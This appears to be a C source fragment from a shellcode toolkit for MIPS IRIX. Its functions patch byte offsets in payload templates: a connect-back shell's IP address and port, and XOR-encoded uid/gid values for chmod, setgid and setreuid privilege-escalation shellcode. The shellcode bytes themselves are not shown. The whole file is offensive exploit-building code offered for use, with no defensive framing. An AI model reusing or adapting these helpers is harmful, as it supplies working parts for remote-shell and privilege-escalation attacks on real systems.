/* set the uid, gid and pathname of the mips-irix-chmod code at `code'
 * XXX: be sure to have strlen(pathname) bytes left after code
 */
void
mips_irix_chmod_setup (unsigned char *code, char *pathname,
	unsigned short int uid, unsigned short int gid)
{
	unsigned short int	len = 0xfeb8;

	uid ^= 0x5555;
	code[6] = (uid >> 8) & 0xff;
	code[7] = uid & 0xff;

	gid ^= 0x5555;
	code[14] = (gid >> 8) & 0xff;
	code[15] = gid & 0xff;

	len += strlen (pathname);
	code[26] = (len >> 8) & 0xff;
	code[27] = len & 0xff;

	memcpy (code + 64, pathname, strlen (pathname));

	return;
}


/* ip and port in network byte order
 */
void
mips_irix_connectsh_setup (unsigned char *code,
	unsigned long int ip, unsigned short int port)
{
	code[38] = (port >> 8) & 0xff;
	code[39] = port & 0xff;

	code[46] = (ip >> 24) & 0xff;
	code[47] = (ip >> 16) & 0xff;
	code[50] = (ip >> 8) & 0xff;
	code[51] = ip & 0xff;

	return;
}


/* set the gid within the 'mips-irix-setgid' code at `code'
 */
void
mips_irix_setgid_setup (unsigned char *code, unsigned short int gid)
{
	gid ^= 0x5555;

	code[2] = (gid >> 8) & 0xff;
	code[3] = gid & 0xff;

	return;
}


void
mips_irix_setreuid_setup (unsigned char *code,
	unsigned short int ruid, unsigned short int euid)
{
	ruid ^= 0x5555;
	code[2] = (ruid >> 8) & 0xff;
	code[3] = ruid & 0xff;

	euid ^= 0x5555;
	code[6] = (euid >> 8) & 0xff;
	code[7] = euid & 0xff;

	return;
}


